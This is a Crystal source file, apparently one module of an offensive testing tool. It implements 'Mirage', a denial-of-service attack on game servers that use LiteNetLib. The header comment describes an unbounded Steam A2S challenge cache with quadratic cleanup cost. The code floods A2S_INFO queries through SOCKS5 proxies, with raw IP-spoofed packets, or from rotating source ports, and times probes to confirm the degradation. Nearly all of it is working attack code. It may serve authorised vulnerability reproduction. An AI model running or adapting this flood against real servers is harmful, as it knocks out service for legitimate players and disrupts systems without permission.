require "../packet"
require "../raw_udp"
require "../target"
require "socket"
require "atomic"

module Strain
  # MIRAGE — Finding Q
  #
  # LiteNetLib.LiteNetManager._challenges is an unbounded
  # Dictionary<IPEndPoint, ChallengeInfo> that caches Steam A2S query
  # challenges (LiteNetLib.LiteNetManager.cs:106). The cleanup runs
  # synchronously on each incoming verify-failed packet whose byte[4] == 0x54
  # (Steam A2S header 'T'). Cleanup is O(n): builds a List<IPEndPoint> of
  # expired entries, then iterates Remove per item.
  #
  #   long num = Stopwatch.GetTimestamp() - 40000000;  // ~4s window
  #   foreach (...)  if (challenge.Value.Timestamp < num) list.Add(...)
  #   foreach (...)  _challenges.Remove(item)
  #
  # New endpoint -> _challenges[remoteEndPoint] = new ChallengeInfo
  # via set_Item, no cap.
  #
  # Attack: flood A2S queries with rotating src ports. Each fresh endpoint
  # adds one dict entry; never reply to the challenge so entry persists 4s.
  # At 100k unique endpoints, every subsequent A2S query (from any client)
  # synchronously walks the whole dict twice -> quadratic CPU degradation.
  #
  # Pre-auth path: triggers BEFORE Stage-1 ECDSA, _connectionRequests,
  # CheckIpRateLimit, CheckUserRateLimit. Lowest-cost attack of the three.
  module Mirage
    # Steam A2S_INFO query: \xff\xff\xff\xff T "Source Engine Query\x00"
    A2S_INFO_QUERY = Bytes[
      0xff_u8, 0xff_u8, 0xff_u8, 0xff_u8,
      0x54_u8,                                                       # A2S_INFO type
      0x53_u8, 0x6f_u8, 0x75_u8, 0x72_u8, 0x63_u8, 0x65_u8, 0x20_u8, # "Source "
      0x45_u8, 0x6e_u8, 0x67_u8, 0x69_u8, 0x6e_u8, 0x65_u8, 0x20_u8, # "Engine "
      0x51_u8, 0x75_u8, 0x65_u8, 0x72_u8, 0x79_u8, 0x00_u8,          # "Query\0"
    ]

    record Config,
      target : Target,
      fibers : Int32,
      duration : Time::Span,
      cool : Time::Span,
      raw_spoof : Bool,
      spoof_base : String,
      spoof_ips : Int32,
      spoof_ports : Int32,
      pps : Int32,
      proxy_pool : Socks5::Pool?

    record Outcome,
      cold_a2s_rtt_ms : Float64,
      cold_a2s_label : String,
      mid_a2s_rtt_ms : Float64,
      mid_a2s_label : String,
      post_a2s_rtt_ms : Float64,
      post_a2s_label : String,
      packets_sent : Int64,
      endpoints : Int64,
      udp_drops_delta : Int64?,
      accepted_estimate : Int64?,
      verdict : String,
      reproduced : Bool

    # One-shot A2S query timer. Returns rtt + reply byte[4] if any.
    record A2SResult, rtt_ms : Float64, label : String

    def self.a2s_pulse(target : Target, *, timeout : Time::Span = 2.seconds,
                       proxy_pool : Socks5::Pool? = nil) : A2SResult
      if pool = proxy_pool
        t0 = Time.monotonic
        session = nil
        begin
          session = pool.open(target)
          session.send(A2S_INFO_QUERY)
          rbuf = Bytes.new(2048)
          n = session.receive(rbuf)
          elapsed = (Time.monotonic - t0).total_milliseconds
          return A2SResult.new(elapsed, "silent") unless n
          return A2SResult.new(elapsed, fmt_a2s_response(rbuf, n))
        rescue ex : IO::Error | Socket::Error
          return A2SResult.new((Time.monotonic - t0).total_milliseconds, "probe-error(#{ex.class})")
        ensure
          session.try &.close rescue nil
        end
      end

      socket = UDPSocket.new
      socket.bind "0.0.0.0", 0
      socket.read_timeout = timeout
      t0 = Time.monotonic
      socket.send(A2S_INFO_QUERY, to: Socket::IPAddress.new(target.host, target.port))
      begin
        rbuf = Bytes.new(2048)
        n, _ = socket.receive(rbuf)
        elapsed = (Time.monotonic - t0).total_milliseconds
        A2SResult.new(elapsed, fmt_a2s_response(rbuf, n))
      rescue IO::TimeoutError
        A2SResult.new((Time.monotonic - t0).total_milliseconds, "silent")
      end
    ensure
      socket.try &.close rescue nil
    end

    private def self.fmt_a2s_response(rbuf : Bytes, n : Int32) : String
      if n >= 5 && rbuf[0] == 0xff && rbuf[1] == 0xff && rbuf[2] == 0xff && rbuf[3] == 0xff
        case rbuf[4]
        when 0x41_u8 then "S2CChallenge(#{n}B)"
        when 0x49_u8 then "A2SInfo(#{n}B)"
        when 0x44_u8 then "A2SPlayer(#{n}B)"
        else              sprintf("Steam-resp 0x%02x(%dB)", rbuf[4], n)
        end
      else
        sprintf("garbled(%dB)", n)
      end
    end

    private def self.run_proxy(cfg : Config, pool : Socks5::Pool) : Outcome
      cold = a2s_pulse(cfg.target, proxy_pool: pool)
      puts "[1] cold A2S pulse through SOCKS5: #{cold.rtt_ms.round(1)} ms  #{cold.label}"

      counter = Atomic(Int64).new(0_i64)
      endpoint_counter = Atomic(Int64).new(0_i64)
      pace_counter = Atomic(Int64).new(0_i64)
      stop = Atomic(Bool).new(false)
      done = Channel(Nil).new(cfg.fibers)
      mid = nil
      rate_label = cfg.pps > 0 ? "#{cfg.pps} pps" : "unlimited pps"

      puts "[2] SOCKS5 A2S flood (#{cfg.fibers} fibers, #{cfg.duration.total_seconds.round(1)}s, #{rate_label})"
      flood_started_at = Time.monotonic
      cfg.fibers.times do
        spawn do
          batch = 0
          loop do
            break if stop.get
            begin
              RawUDP.pace_total_rate(pace_counter.add(1_i64), cfg.pps, flood_started_at)
              if pool.send_once(cfg.target, A2S_INFO_QUERY)
                counter.add(1_i64)
                endpoint_counter.add(1_i64)
              end
            rescue IO::Error | Socket::Error
              # one proxy send skipped
            end
            batch += 1
            Fiber.yield if batch & 0x1f == 0
          end
          done.send(nil)
        end
      end

      mid_at = Time.monotonic + cfg.duration / 2
      end_at = Time.monotonic + cfg.duration
      while Time.monotonic < end_at
        sleep 0.5.seconds
        if mid.nil? && Time.monotonic >= mid_at
          mid = a2s_pulse(cfg.target, timeout: 3.seconds, proxy_pool: pool)
          puts "    mid A2S pulse:  #{mid.rtt_ms.round(1)} ms  #{mid.label}  (sent ~#{counter.get}, proxy-sessions ~#{endpoint_counter.get})"
        end
      end

      stop.set(true)
      cfg.fibers.times { done.receive }

      sent = counter.get
      endpoints = endpoint_counter.get
      mid ||= a2s_pulse(cfg.target, timeout: 3.seconds, proxy_pool: pool)
      puts "    SOCKS5 flood stopped. sent ~#{sent} A2S queries, #{endpoints} proxy sessions."

      sleep cfg.cool
      post = a2s_pulse(cfg.target, timeout: 3.seconds, proxy_pool: pool)
      puts "[3] post A2S pulse through SOCKS5: #{post.rtt_ms.round(1)} ms  #{post.label}"

      verdict, reproduced = classify(cold, mid, post, sent, endpoints, nil, nil)
      Outcome.new(cold.rtt_ms, cold.label, mid.rtt_ms, mid.label, post.rtt_ms, post.label, sent, endpoints, nil, nil, verdict, reproduced)
    ensure
      stop.try &.set(true)
    end

    private def self.run_raw_spoof(cfg : Config) : Outcome
      target_ip = RawUDP.parse_ipv4_u32(cfg.target.host)
      source_base = RawUDP.validate_spoof_range!(cfg.spoof_base, cfg.spoof_ips, cfg.spoof_ports)
      max_endpoints = RawUDP.max_endpoints(cfg.spoof_ips, cfg.spoof_ports)
      packet_size = RawUDP.packet_size(A2S_INFO_QUERY.size)
      sockaddr = RawUDP.sockaddr(target_ip, cfg.target.port)

      probe_raw_fd = RawUDP.open_socket
      LibC.close(probe_raw_fd)

      cold = a2s_pulse(cfg.target)
      puts "[1] cold A2S pulse: #{cold.rtt_ms.round(1)} ms  #{cold.label}"
      drops_before = RawUDP.udp_drops_for_port(cfg.target.port)

      counter = Atomic(Int64).new(0_i64)
      endpoint_counter = Atomic(Int64).new(0_i64)
      next_endpoint = Atomic(Int64).new(0_i64)
      stop = Atomic(Bool).new(false)
      done = Channel(Nil).new(cfg.fibers)
      mid = nil
      rate_label = cfg.pps > 0 ? "#{cfg.pps} pps" : "unlimited pps"

      puts "[2] raw-spoof A2S flood (#{cfg.fibers} fibers, #{cfg.duration.total_seconds.round(1)}s, #{rate_label}, max endpoints #{max_endpoints})"
      flood_started_at = Time.monotonic
      cfg.fibers.times do
        spawn do
          raw_fd = -1
          begin
            raw_fd = RawUDP.open_socket
            packet = Bytes.new(packet_size)
            batch = 0
            loop do
              break if stop.get
              seq = next_endpoint.add(1_i64)
              break if seq >= max_endpoints
              RawUDP.pace_total_rate(seq, cfg.pps, flood_started_at)
              src_ip, src_port = RawUDP.endpoint_at(source_base, cfg.spoof_ports, seq)

              RawUDP.build_packet!(
                packet,
                A2S_INFO_QUERY,
                src_ip: src_ip,
                dst_ip: target_ip,
                src_port: src_port,
                dst_port: cfg.target.port,
                ident: seq.to_u32
              )

              if RawUDP.send_packet(raw_fd, sockaddr, packet)
                counter.add(1_i64)
                endpoint_counter.add(1_i64)
              end

              batch += 1
              Fiber.yield if batch & 0xff == 0
            end
          rescue ex
            STDERR.puts "    raw-spoof worker stopped: #{ex.message}"
          ensure
            LibC.close(raw_fd) if raw_fd >= 0
            done.send(nil)
          end
        end
      end

      mid_at = Time.monotonic + cfg.duration / 2
      end_at = Time.monotonic + cfg.duration
      next_tick = Time.monotonic
      while Time.monotonic < end_at
        next_tick += 1.second if next_tick < end_at
        next_tick = end_at if next_tick > end_at
        sleep_for = next_tick - Time.monotonic
        sleep sleep_for if sleep_for.positive?
        printf "  t=%5.1fs  sent~%d  endpoints~%d\n",
          (Time.monotonic - flood_started_at).total_seconds,
          counter.get,
          endpoint_counter.get
        if mid.nil? && Time.monotonic >= mid_at
          mid = a2s_pulse(cfg.target, timeout: 3.seconds)
          puts "    mid A2S pulse:  #{mid.rtt_ms.round(1)} ms  #{mid.label}  (sent ~#{counter.get}, endpoints ~#{endpoint_counter.get})"
        end
      end

      stop.set(true)
      cfg.fibers.times { done.receive }

      sent = counter.get
      endpoints = endpoint_counter.get
      mid ||= a2s_pulse(cfg.target, timeout: 3.seconds)
      puts "    raw-spoof flood stopped. sent ~#{sent} A2S queries, #{endpoints} endpoints."

      sleep cfg.cool
      post = a2s_pulse(cfg.target, timeout: 3.seconds)
      puts "[3] post A2S pulse: #{post.rtt_ms.round(1)} ms  #{post.label}"

      drops_after = RawUDP.udp_drops_for_port(cfg.target.port)
      drops_delta = if drops_before && drops_after
                      drops_after - drops_before
                    end
      accepted = RawUDP.accepted_estimate(sent, drops_delta)

      verdict, reproduced = classify(cold, mid, post, sent, endpoints, drops_delta, accepted)
      Outcome.new(cold.rtt_ms, cold.label, mid.rtt_ms, mid.label, post.rtt_ms, post.label, sent, endpoints, drops_delta, accepted, verdict, reproduced)
    ensure
      stop.try &.set(true)
    end

    def self.run(cfg : Config) : Outcome
      if pool = cfg.proxy_pool
        return run_proxy(cfg, pool)
      end
      return run_raw_spoof(cfg) if cfg.raw_spoof

      cold = a2s_pulse(cfg.target)
      puts "[1] cold A2S pulse: #{cold.rtt_ms.round(1)} ms  #{cold.label}"

      counter = Atomic(Int64).new(0_i64)
      endpoint_counter = Atomic(Int64).new(0_i64)
      pace_counter = Atomic(Int64).new(0_i64)
      stop = Atomic(Bool).new(false)
      done = Channel(Nil).new(cfg.fibers)
      mid = nil
      drops_before = RawUDP.udp_drops_for_port(cfg.target.port)

      rate_label = cfg.pps > 0 ? "#{cfg.pps} pps" : "unlimited pps"
      puts "[2] flood (#{cfg.fibers} fibers, #{cfg.duration.total_seconds.round(1)}s, #{rate_label})"
      flood_started_at = Time.monotonic
      cfg.fibers.times do
        spawn do
          rng = Random.new
          dest = Socket::IPAddress.new(cfg.target.host, cfg.target.port)
          batch = 0
          loop do
            break if stop.get
            socket = UDPSocket.new
            begin
              socket.bind("0.0.0.0", 0)
              RawUDP.pace_total_rate(pace_counter.add(1_i64), cfg.pps, flood_started_at)
              socket.send(A2S_INFO_QUERY, to: dest)
              counter.add(1_i64)
              endpoint_counter.add(1_i64)
            rescue IO::Error
              # one packet skipped
            ensure
              socket.close rescue nil
            end
            batch += 1
            Fiber.yield if batch & 0x1f == 0
          end
          done.send(nil)
        end
      end

      mid_at = Time.monotonic + cfg.duration / 2
      end_at = Time.monotonic + cfg.duration
      while Time.monotonic < end_at
        sleep 0.5.seconds
        if mid.nil? && Time.monotonic >= mid_at
          mid = a2s_pulse(cfg.target, timeout: 3.seconds)
          puts "    mid A2S pulse:  #{mid.rtt_ms.round(1)} ms  #{mid.label}  (sent ~#{counter.get}, endpoints ~#{endpoint_counter.get})"
        end
      end

      stop.set(true)
      cfg.fibers.times { done.receive }

      sent = counter.get
      endpoints = endpoint_counter.get
      mid ||= a2s_pulse(cfg.target, timeout: 3.seconds)
      puts "    flood stopped. sent ~#{sent} A2S queries, #{endpoints} endpoints."

      sleep cfg.cool
      post = a2s_pulse(cfg.target, timeout: 3.seconds)
      puts "[3] post A2S pulse: #{post.rtt_ms.round(1)} ms  #{post.label}"

      drops_after = RawUDP.udp_drops_for_port(cfg.target.port)
      drops_delta = if drops_before && drops_after
                      drops_after - drops_before
                    end
      accepted = RawUDP.accepted_estimate(sent, drops_delta)

      verdict, reproduced = classify(cold, mid, post, sent, endpoints, drops_delta, accepted)
      Outcome.new(
        cold.rtt_ms,
        cold.label,
        mid.rtt_ms,
        mid.label,
        post.rtt_ms,
        post.label,
        sent,
        endpoints,
        drops_delta,
        accepted,
        verdict,
        reproduced,
      )
    end

    private def self.classify(cold : A2SResult, mid : A2SResult, post : A2SResult, sent : Int64,
                              endpoints : Int64, udp_drops_delta : Int64?,
                              accepted : Int64?) : {String, Bool}
      cold_ok = cold.label.starts_with?("S2CChallenge") || cold.label.starts_with?("A2SInfo")
      degraded_mid = mid.label == "silent" || mid.rtt_ms > cold.rtt_ms * 5 || mid.rtt_ms > 500
      degraded_post = post.label == "silent" || post.rtt_ms > cold.rtt_ms * 5 || post.rtt_ms > 500

      if cold_ok && (degraded_mid || degraded_post)
        msg = String.build do |s|
          s << "Mirage REPRODUCED: A2S query response degraded under flood.\n"
          s << "  cold A2S  -> #{cold.label} in #{cold.rtt_ms.round(1)} ms (baseline)\n"
          s << "  mid  A2S  -> #{mid.label} in #{mid.rtt_ms.round(1)} ms\n"
          s << "  post A2S  -> #{post.label} in #{post.rtt_ms.round(1)} ms\n"
          s << "  packets   -> #{sent} A2S queries sent\n"
          s << "  endpoints -> #{endpoints} unique source endpoints\n"
          s << "  accepted  -> ~#{accepted}\n" if accepted
          s << "  udp drops -> +#{udp_drops_delta}\n" if udp_drops_delta && udp_drops_delta > 0
          s << "  Server browser visibility degraded; legitimate Steam clients\n"
          s << "  cannot enumerate the server while flood persists. Pre-auth\n"
          s << "  path: triggers before Stage-1 ECDSA, _connectionRequests,\n"
          s << "  CheckIpRateLimit. Lowest-cost vector."
        end
        {msg, true}
      elsif !cold_ok
        {"Mirage inconclusive: baseline A2S did not return a Steam reply (#{cold.label}). Is the server in online mode?", false}
      else
        drops_note = udp_drops_delta && udp_drops_delta > 0 ? " Kernel UDP drops increased by #{udp_drops_delta}." : ""
        accepted_note = accepted ? " accepted estimate #{accepted}." : ""
        {"Mirage not reproduced: A2S RTT stayed within 5x of cold (#{cold.rtt_ms.round(1)} -> mid #{mid.rtt_ms.round(1)} -> post #{post.rtt_ms.round(1)} ms), sent #{sent} packets across #{endpoints} endpoints.#{accepted_note}#{drops_note}", false}
      end
    end
  end
end
